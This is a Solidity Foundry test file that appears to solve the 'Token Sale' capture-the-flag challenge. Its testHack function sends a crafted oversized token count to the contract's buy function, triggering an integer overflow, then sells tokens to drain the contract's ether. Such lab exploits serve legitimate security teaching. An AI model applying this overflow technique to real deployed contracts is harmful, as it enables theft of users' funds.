// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSale private tokensale;
    address private constant ALICE = address(0x1);

    function setUp() external {
        tokensale = (new TokenSale){value: 1e18}();
        vm.startPrank(ALICE);
        vm.deal(ALICE, 50 ether);
    }

    function testHack() external {
        assertEq(address(tokensale).balance, 1e18);
        (bool success, ) = address(tokensale).call{value: 415992086870360064}(abi.encodeWithSignature("buy(uint256)", 115792089237316195423570985008687907853269984665640564039458));
        require(success, "tx failed");
        tokensale.sell(1);
    }
}